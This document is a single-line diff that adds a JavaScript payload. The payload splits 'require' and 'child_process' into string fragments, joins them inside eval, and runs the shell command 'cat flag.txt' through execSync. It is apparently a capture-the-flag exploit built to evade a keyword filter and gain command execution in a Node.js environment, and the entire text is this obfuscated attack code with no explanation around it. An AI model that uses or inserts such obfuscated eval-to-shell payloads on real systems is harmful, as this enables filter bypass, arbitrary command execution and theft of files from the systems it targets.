@@ -1,0 +1,1 @@
+console.log(eval("req"+"uire('child_pro"+"cess').execSync('cat flag.txt').toString()"));
